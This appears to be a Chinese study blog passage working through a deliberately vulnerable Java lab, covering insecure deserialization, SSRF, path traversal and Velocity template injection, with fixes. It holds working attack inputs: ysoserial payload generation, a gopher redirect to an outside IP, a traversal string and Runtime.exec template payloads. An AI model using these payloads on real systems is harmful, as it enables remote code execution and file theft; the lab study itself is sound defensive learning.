<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line"><span class="comment">//创建文件读取流</span></span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line"><span class="comment">//创建对象输入流，包装文件输入流，由于反序列化 </span></span><br><span class="line">    obj = (MyClass) in.readObject();</span><br><span class="line"><span class="comment">//反序列化操作，readObject()返回的是Object类型，所以要进行强制类型转换</span></span><br></pre></td></tr></table></figure>



<p>核心代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(&quot;/rememberMe/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">rememberMeVul</span><span class="params">(HttpServletRequest request)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"><span class="comment">//标准库中没有getCookie这个方法，应该是一个自定义方法使用getCookies和Constants.REMEMBER_ME_COOKIE常量进行Cookie值的查找rememberMe</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == cookie) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No rememberMe cookie. Right?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">rememberMe</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);</span><br><span class="line"><span class="comment">//对我们Cookie的值进行Base64解码然后按字节放入数组中</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decoded);</span><br><span class="line"><span class="comment">//创建字节数组的输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line"><span class="comment">//创建对象输入流</span></span><br><span class="line">        in.readObject();</span><br><span class="line"><span class="comment">//进行反序列化</span></span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Are u ok?&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>虽然没有任何过滤就直接进行反序列化了，但是由于没有看到可以攻击的类我也不知道该怎么使用</p>
<p>看了一下发现我是对的，完全不知道怎么找链子，但是已经有工具进行直接输出链子了，</p>


<p>我们只需要加入<code>rememberMe</code>参数然后把我们脚本生成的链子进行base64编码然后发送即可，真的是完全不会啊</p>
<p>还有就是不知道为什么用PS的时候脚本返回结果总是不对，要编码就不能用PS</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:: 生成 payload</span><br><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span> &gt; payload.bin</span><br><span class="line"></span><br><span class="line">:: 转换为 Base64</span><br><span class="line">certutil -encode payload.bin payload.txt</span><br><span class="line"></span><br><span class="line">:: 查看结果（注意 certutil 会添加换行）</span><br><span class="line"><span class="built_in">type</span> payload.txt</span><br></pre></td></tr></table></figure>

<p>但是如果不进行编码就是乱码，只能转Base64了，至于这个生成文件会自动换行，使用NotePad++替换一下就行了</p>
<p>让我们来看修复代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(&quot;/rememberMe/security&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">rememberMeBlackClassCheck</span><span class="params">(HttpServletRequest request)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == cookie) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No rememberMe cookie. Right?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rememberMe</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decoded);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">AntObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntObjectInputStream</span>(bytes);  <span class="comment">// throw InvalidClassException</span></span><br><span class="line"><span class="comment">//这里创建对象输入流不是使用java自带的ObjectInputStream而是自定义了 其他和原来的代码没区别</span></span><br><span class="line">            in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidClassException e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m very OK.&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><strong>AntObjectInputStream</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Logger logger= LoggerFactory.getLogger(AntObjectInputStream.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造方法首先初始化父类调用ObjectInputStream的构造方法InputStream输入流作为参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重写resolveClass方法，实现反序列化类的黑白名单校验</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc 待反序列化的类描述符</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 允许反序列化的Class对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果IO异常</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassNotFoundException 如果类未找到</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InvalidClassException 如果类在黑名单中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(<span class="keyword">final</span> ObjectStreamClass desc)</span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> desc.getName();</span><br><span class="line"><span class="comment">//获取反序列化的名字</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject</span></span><br><span class="line">        logger.info(<span class="string">&quot;Deserialize class name: &quot;</span> + className);</span><br><span class="line"></span><br><span class="line">        String[] denyClasses = &#123;<span class="string">&quot;java.net.InetAddress&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//黑名单</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String denyClass : denyClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(denyClass)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//如果未被黑名单过滤则调用原来的resolveClass方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 定义myObj对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个包含对象进行反序列化信息的/tmp/object数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/tmp/object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// writeObject()方法将myObj对象写入/tmp/object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件中反序列化obj对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/object&quot;</span>);</span><br><span class="line">        <span class="type">AntObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntObjectInputStream</span>(fis);  <span class="comment">// AntObjectInputStream class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//恢复对象即反序列化</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span>  <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然还是有点看不懂，但是大概意思就是通过继承ObjectStreamInput类然后重写方法对我们反序列化的类进行过滤，如果调用了黑名单的类就抛出异常否则就调用原来的方法</p>
<h2 id="9-SSRF"><a href="#9-SSRF" class="headerlink" title="9.SSRF"></a>9.SSRF</h2><p>之前在php中就见过了SSRF，但是好像没有哪个题目专门考SSRF，基本上都是通过各种协议对本机文件进行一个读取然后进行代码审计</p>
<p>但是和之前PHP不一样的就是支持的协议和限定访问的URL都不一样</p>
<p>java支持协议</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc</span><br></pre></td></tr></table></figure>

<p>这里多了两个没见过的mailto和netdoc协议</p>
<p>我们先尝试写下重定向代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;gopher://35.185.163.134:2333/_joy%0achou&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: <span class="subst">$url</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/ssrf/urlConnection/vuln?url=http://127.0.0.1/test.php</span></span><br></pre></td></tr></table></figure>

<p>收到异常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.MalformedURLException: unknown protocol: gopher</span><br></pre></td></tr></table></figure>

<p>查看报错代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">followRedirect</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">this</span>.getInstanceFollowRedirects()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.getResponseCode();</span><br><span class="line">        <span class="keyword">if</span>(var1 &gt;= <span class="number">300</span> &amp;&amp; var1 &lt;= <span class="number">307</span> &amp;&amp; var1 != <span class="number">306</span> &amp;&amp; var1 != <span class="number">304</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.getHeaderField(<span class="string">&quot;Location&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                URL var3;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 该行代码发生异常，var2变量值为`gopher://35.185.163.134:2333/_joy%0achou`</span></span><br><span class="line">                    var3 = <span class="keyword">new</span> <span class="title class_">URL</span>(var2);</span><br><span class="line">                    <span class="comment">/* 该行代码，表示传入的协议必须和重定向的协议一致</span></span><br><span class="line"><span class="comment">                     * 即http://joychou.me/302.php的协议必须和gopher://35.185.163.134:2333/_joy%0achou一致</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="built_in">this</span>.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (MalformedURLException var8) &#123;</span><br><span class="line">                    var3 = <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.url, var2);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>从上面的followRedirect方法可以看到：</p>
<ul>
<li>实际跳转的URL也在限制的协议内</li>
<li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li>
</ul>
<p>所以，Java的SSRF利用方式比较局限：</p>
<ul>
<li>利用file协议任意文件读取</li>
<li>利用http协议探测端口或攻击内网服务</li>
</ul>
<p>也就是说JAVA就先不要想着通过SSRF重定向进行攻击了</p>
<p>至于靶场的代码，我感觉就是一个为过滤的file协议，代码还好长，懒得看了</p>
<p>未过滤代码就是直接对Url进行访问，返回结果</p>


<p>修复代码则是直接限定URL前缀为http即可</p>
<h2 id="10-PathTraversal"><a href="#10-PathTraversal" class="headerlink" title="10.PathTraversal"></a>10.PathTraversal</h2><p>也就是目录遍历漏洞，我们之前已经在文件上传中看到过了，我们可以利用文件名直接进行保存的时候通过控制文件名进行目录跨越上传文件到网站根目录</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@GetMapping(&quot;/path_traversal/vul&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getImage</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> getImgBase64(filepath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getImgBase64</span><span class="params">(String imgFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        logger.info(<span class="string">&quot;Working directory: &quot;</span> + System.getProperty(<span class="string">&quot;user.dir&quot;</span>));</span><br><span class="line">        logger.info(<span class="string">&quot;File path: &quot;</span> + imgFile);</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(imgFile);</span><br><span class="line">        <span class="keyword">if</span> (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line"><span class="comment">//检查文件是否存在并且非目录</span></span><br><span class="line">            <span class="type">byte</span>[] data = Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.encodeBase64(data));</span><br><span class="line"><span class="comment">//读取文件的字节数据并进行base64编码</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File doesn&#x27;t exist or is not a file.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个题目我只能看看代码就行了，就是先根据路径获取到文件然后判读文件是否存在，最后返回base64数据，需要注意的是Windows路径想通过URL传递必须先编码不然会爆400</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cflag.txt</span><br></pre></td></tr></table></figure>



<p>修复代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@GetMapping(&quot;/path_traversal/sec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getImageSec</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (SecurityUtil.pathFilter(filepath) == <span class="literal">null</span>) &#123;</span><br><span class="line">            logger.info(<span class="string">&quot;Illegal file path: &quot;</span> + filepath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Bad boy. Illegal file path.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getImgBase64(filepath);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这里只是换了一个类的方法对路径进行过滤</span></span><br></pre></td></tr></table></figure>

<p>pathFilter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">pathFilter</span><span class="params">(String filepath)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> filepath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use while to sovle multi urlencode</span></span><br><span class="line">    <span class="keyword">while</span> (temp.indexOf(<span class="string">&#x27;%&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            temp = URLDecoder.decode(temp, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            logger.info(<span class="string">&quot;Unsupported encoding exception: &quot;</span> + filepath);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (temp.contains(<span class="string">&quot;..&quot;</span>) || temp.charAt(<span class="number">0</span>) == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filepath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对我们<code>..</code>和<code>/</code>进行了过滤虽然第二个过滤拦不住Windows，但是没有<code>..</code>进行目录跨越也是没用的</p>
<h2 id="11-SSTI"><a href="#11-SSTI" class="headerlink" title="11.SSTI"></a>11.SSTI</h2><p>第一次学习SSTI实在flask的模板渲染中，SSTI的防御手段只有一种就是进行过滤，但是不同语言不同引擎的注入方法都不一样。</p>
<p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
<p>我们来看代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@GetMapping(&quot;/velocity&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">velocity</span><span class="params">(String template)</span> &#123;</span><br><span class="line"><span class="comment">//初始化Velcity引擎 可以提前配置安全参数</span></span><br><span class="line">        Velocity.init();</span><br><span class="line"><span class="comment">//创建Velocity上下文，注入变量（硬编码安全数据）</span></span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Elliot A.&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;address&quot;</span>, <span class="string">&quot;217 E Broadway&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;555-1337&quot;</span>);</span><br><span class="line"><span class="comment">//这些代码是为了模板渲染时添加变量$author调用值</span></span><br><span class="line"> <span class="comment">//渲染用户提供的模板</span></span><br><span class="line">    <span class="type">StringWriter</span> <span class="variable">swOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">    Velocity.evaluate(</span><br><span class="line">        context,      <span class="comment">// 上下文变量</span></span><br><span class="line">        swOut,        <span class="comment">// 输出写入到StringWriter</span></span><br><span class="line">        <span class="string">&quot;test&quot;</span>,       <span class="comment">// 日志标识（无实际作用）</span></span><br><span class="line">        template      <span class="comment">// 用户控制的模板内容（危险！）</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 注：渲染结果未返回，但攻击者可通过恶意模板直接执行代码</span></span><br></pre></td></tr></table></figure>

<p>网上没有关于java中FreeMarker等引擎的专门教程，不知道是CTF不怎么考还是什么，这里就只是抄一下payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set($x=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">$x.class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?template=#set($e=<span class="string">&quot;e&quot;</span>);$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc.exe&quot;</span>)</span><br><span class="line"><span class="comment">//#set($e=&quot;e&quot;); 这个是为了定义一个String对象</span></span><br><span class="line"><span 